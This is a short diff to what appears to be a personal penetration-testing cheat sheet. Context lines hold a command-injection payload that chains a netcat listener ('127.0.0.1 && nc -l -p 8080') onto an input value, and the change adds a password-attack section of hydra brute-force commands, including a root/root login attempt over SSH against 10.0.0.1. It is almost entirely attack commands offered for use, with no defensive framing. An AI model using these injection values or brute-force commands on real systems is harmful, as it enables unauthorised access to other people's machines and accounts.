@@ -41,4 +41,10 @@ echo Injected| #perl
 #is nc on the system? stuff can be done with that
 127.0.0.1 && nc -l -p 8080
 
+--# PASSWORD ATCK #--
+hydra -l <user> -p <pw> <protocol>://<ip> #-L for file, -P for file
+hydra -l root -p root ssh://10.0.0.1
+protocol - telnet, ftp, smb, etc
+
+
 --# XSS #--
